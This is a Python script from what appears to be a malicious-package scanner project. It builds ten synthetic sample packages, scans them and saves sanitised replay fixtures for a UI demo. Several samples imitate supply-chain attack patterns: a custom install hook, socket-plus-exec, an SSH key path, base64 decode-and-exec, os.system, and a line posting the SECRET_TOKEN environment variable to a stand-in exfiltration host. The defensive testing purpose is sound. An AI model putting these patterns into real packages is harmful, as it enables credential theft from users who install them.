#!/usr/bin/env python
"""
Person_A/pipeline/make_replay_fixtures.py
----------------------------------------
Selects 10 representative packages from malicious rescan / test archetypes:
- 5 suspicious (one each for S1..S5)
- 1 unable_to_assess
- 1 none_detected with review_recommended
- 3 diverse others (none_detected)

Builds valid scan_records with:
- record_origin: "replay"
- target.kind: "archive"
- target.artifact.format: "tar.gz"
- findings carry sanitized snippets (<= 8 lines, 120 chars/line, redacted hosts/tokens/blobs)
- saves to fixtures/replay/NN_<package-id>.json
"""

import argparse
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from spider.engine.scan import scan_directory
from spider.engine.sanitize import sanitize_scan_record_for_replay
from spider_contract.validate import schema_errors, semantic_errors

ROOT = Path(__file__).resolve().parents[2]
OUT_DIR = ROOT / "fixtures" / "replay"

REPLAY_SPECS = [
    {
        "num": "01",
        "pkg_name": "mal-s1-install-hook",
        "version": "1.0.0",
        "archive": "mal-s1-install-hook-1.0.0.tar.gz",
        "role": "S1_install_command",
        "code": (
            "import setuptools\n"
            "from setuptools.command.install import install\n\n"
            "class CustomInstall(install):\n"
            "    def run(self):\n"
            "        install.run(self)\n\n"
            "setuptools.setup(\n"
            "    name='mal-s1-install-hook',\n"
            "    version='1.0.0',\n"
            "    cmdclass={'install': CustomInstall}\n"
            ")\n"
        ),
    },
    {
        "num": "02",
        "pkg_name": "mal-s2-socket-exec",
        "version": "2.0.0",
        "archive": "mal-s2-socket-exec-2.0.0.tar.gz",
        "role": "S2_dynamic_exec_plus",
        "code": (
            "import socket\n\n"
            "def run_beacon():\n"
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "    payload = 'print(1)'\n"
            "    exec(payload)\n"
        ),
    },
    {
        "num": "03",
        "pkg_name": "mal-s3-credential-exfil",
        "version": "1.1.0",
        "archive": "mal-s3-credential-exfil-1.1.0.tar.gz",
        "role": "S3_credential_net",
        "code": (
            "import socket\n\n"
            "SSH_KEY = '.ssh/id_rsa'\n"
            "def send_key():\n"
            "    s = socket.socket()\n"
            "    pass\n"
        ),
    },
    {
        "num": "04",
        "pkg_name": "mal-s4-env-post",
        "version": "3.1.2",
        "archive": "mal-s4-env-post-3.1.2.tar.gz",
        "role": "S4_env_post",
        "code": (
            "import os\n"
            "import requests\n\n"
            "def sync_config():\n"
            "    env_data = os.environ.get('SECRET_TOKEN', 'none')\n"
            "    requests.post('https://evil-exfil-server.test/data', data={'t': env_data})\n"
        ),
    },
    {
        "num": "05",
        "pkg_name": "mal-s5-decode-exec",
        "version": "1.0.4",
        "archive": "mal-s5-decode-exec-1.0.4.tar.gz",
        "role": "S5_decode_exec",
        "code": (
            "import base64\n\n"
            "blob = b'cHJpbnQoImhlbGxvIHdvcmxkIik='\n"
            "code = base64.b64decode(blob)\n"
            "exec(code)\n"
        ),
    },
    {
        "num": "06",
        "pkg_name": "mal-unable-binary-heavy",
        "version": "0.9.0",
        "archive": "mal-unable-binary-heavy-0.9.0.tar.gz",
        "role": "unable_to_assess",
        "is_binary": True,
    },
    {
        "num": "07",
        "pkg_name": "mal-review-sys-command",
        "version": "1.2.0",
        "archive": "mal-review-sys-command-1.2.0.tar.gz",
        "role": "review_recommended",
        "code": (
            "import os\n\n"
            "def clean_cache():\n"
            "    os.system('id')\n"
        ),
    },
    {
        "num": "08",
        "pkg_name": "mal-none-standard-setup",
        "version": "0.1.0",
        "archive": "mal-none-standard-setup-0.1.0.tar.gz",
        "role": "none_detected_standard_setup",
        "code": (
            "import setuptools\n\n"
            "setuptools.setup(\n"
            "    name='mal-none-standard-setup',\n"
            "    version='0.1.0'\n"
            ")\n"
        ),
    },
    {
        "num": "09",
        "pkg_name": "mal-none-helper-utils",
        "version": "2.1.0",
        "archive": "mal-none-helper-utils-2.1.0.tar.gz",
        "role": "none_detected_helper_utils",
        "code": (
            "def format_address(city, zip_code):\n"
            "    return f'{city}, {zip_code}'\n"
        ),
    },
    {
        "num": "10",
        "pkg_name": "mal-none-pure-constants",
        "version": "1.0.0",
        "archive": "mal-none-pure-constants-1.0.0.tar.gz",
        "role": "none_detected_pure_constants",
        "code": (
            "VERSION = '1.0.0'\n"
            "BUFFER_SIZE = 4096\n"
        ),
    },
]


def make_replay_fixtures(out_dir=OUT_DIR):
    out_path = Path(out_dir)
    out_path.mkdir(parents=True, exist_ok=True)
    generated = []

    for spec in REPLAY_SPECS:
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_root = Path(tmpdir) / spec["pkg_name"]
            pkg_root.mkdir(parents=True, exist_ok=True)

            if spec.get("is_binary"):
                bin_file = pkg_root / "libcore.so"
                bin_file.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)
            else:
                py_file = pkg_root / "setup.py" if "setup" in spec["code"] else pkg_root / "main.py"
                py_file.write_text(spec["code"], encoding="utf-8")

            record = scan_directory(pkg_root, name=spec["pkg_name"], version=spec["version"])
            record["record_origin"] = "replay"
            record["target"]["kind"] = "archive"
            record["target"]["artifact"]["format"] = "tar.gz"
            record["target"]["artifact"]["filename"] = spec["archive"]
            record["target"]["hash_verified"] = True

            record = sanitize_scan_record_for_replay(record)

            sch_errs = schema_errors(record)
            if sch_errs:
                raise ValueError(f"Schema error in {spec['pkg_name']}: {sch_errs}")

            sem_errs = semantic_errors(record)
            if sem_errs:
                raise ValueError(f"Semantic error in {spec['pkg_name']}: {sem_errs}")

            fname = f"{spec['num']}_{spec['pkg_name']}.json"
            fpath = out_path / fname
            with open(fpath, "w", encoding="utf-8", newline="\n") as f:
                json.dump(record, f, indent=2, sort_keys=True)
                f.write("\n")

            generated.append(fpath)
            print(f"Generated replay fixture: {fname} (outcome: {record['verdict']['outcome']}, reasons: {record['verdict'].get('reasons')})")

    return generated


def main():
    parser = argparse.ArgumentParser(description="Generate 10 sanitised replay fixtures for Person C UI demo")
    parser.add_argument("--out-dir", default=str(OUT_DIR))
    args = parser.parse_args()
    make_replay_fixtures(args.out_dir)


if __name__ == "__main__":
    main()
